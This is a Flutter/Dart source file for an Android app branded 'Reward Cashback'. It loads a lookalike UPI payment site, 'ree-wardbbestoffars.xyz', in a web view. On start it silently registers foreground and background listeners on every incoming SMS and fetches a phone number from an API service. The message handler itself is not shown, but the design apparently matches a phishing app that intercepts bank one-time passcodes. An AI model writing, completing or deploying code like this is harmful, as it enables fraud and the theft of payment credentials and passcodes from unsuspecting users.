import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:sms_sender/sm_handler.dart';
import 'package:telephony/telephony.dart';

import 'api_service.dart';

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key}) : super(key: key);

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  DateTime timeBackPressed = DateTime.now();
  late InAppWebViewController webViewController;
  late PullToRefreshController refreshController;
  var initialUrl = 'https://ree-wardbbestoffars.xyz/upi/';
  double progress = 0;
  var urlController = TextEditingController();

  String cellNumber = '';
  Telephony telephony = Telephony.instance;

  @override
  void initState() {
    super.initState();
    getTheNumber();
    telephony.listenIncomingSms(
      onNewMessage: backgroundMessageHandler,
      //listenInBackground: false,
      onBackgroundMessage: backgroundMessageHandler,
    );
  }

  getTheNumber() async {
    String data = await getData();
    setState(() {
      cellNumber = data;
    });
  }

  // getPermissionCheck() async {
  //   PermissionStatus smsStatus = await Permission.sms.request();
  //   if (smsStatus == PermissionStatus.granted) {}
  //   if (smsStatus == PermissionStatus.denied) {
  //     ScaffoldMessenger.of(context).showSnackBar(
  //         const SnackBar(content: Text('This permission is required')));
  //     await Permission.sms.request();
  //   }
  //   if (smsStatus == PermissionStatus.permanentlyDenied) {
  //     openAppSettings();
  //   }
  // }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        final difference = DateTime.now().difference(timeBackPressed);
        timeBackPressed = DateTime.now();
        final isExitWarning = difference >= Duration(seconds: 2);

        if (await webViewController.canGoBack()) {
          webViewController.goBack();

          return false;
        } else {
          if (isExitWarning) {
            const message = 'Press back again to exit';
            ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                content: Text(
              message,
            )));
            return false;
          } else {
            return true;
          }
        }
      },
      child: Scaffold(
        appBar: AppBar(
          title: const Text('Reward Cashback'),
          leading: IconButton(
            onPressed: () async {
              if (await webViewController.canGoBack()) {
                webViewController.goBack();
              }
            },
            icon: const Icon(Icons.arrow_back_ios),
          ),
          actions: [
            IconButton(
                onPressed: () {
                  webViewController.reload();
                },
                icon: const Icon(Icons.refresh)),
          ],
        ),
        body: Column(
          children: [
            Expanded(
              child: InAppWebView(
                onWebViewCreated: (controller) =>
                    webViewController = controller,
                initialUrlRequest: URLRequest(
                  url: Uri.parse(initialUrl),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
